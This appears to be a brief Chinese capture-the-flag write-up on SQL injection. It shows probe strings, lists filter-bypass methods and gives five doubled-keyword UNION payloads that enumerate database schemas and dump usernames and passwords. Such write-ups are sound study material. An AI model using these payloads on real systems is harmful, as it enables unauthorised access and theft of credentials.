这题其实很简单，但我想复杂了，

还是得按照`步骤`来测注入。

测试字符串

```
1' or 1=1
1' or 1=1 #
```

经过这一步就能发现`or`被过滤了，

就能考虑绕过了

```
双写绕过
url编码绕过
注释绕过
...
```

用双写绕过

```
1'  uunionnion selselectect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata#
1'  uunionnion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables wwherehere table_schema=database()#
1'  uunionnion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns wwherehere table_schema=database() aandnd table_name='b4bsql'
1'  uunionnion selselectect 1,username,passwoorrd ffromrom geek.b4bsql#
1'  uunionnion selselectect 1,2,group_concat(id,username,passwoorrd) ffromrom b4bsql#
```

 
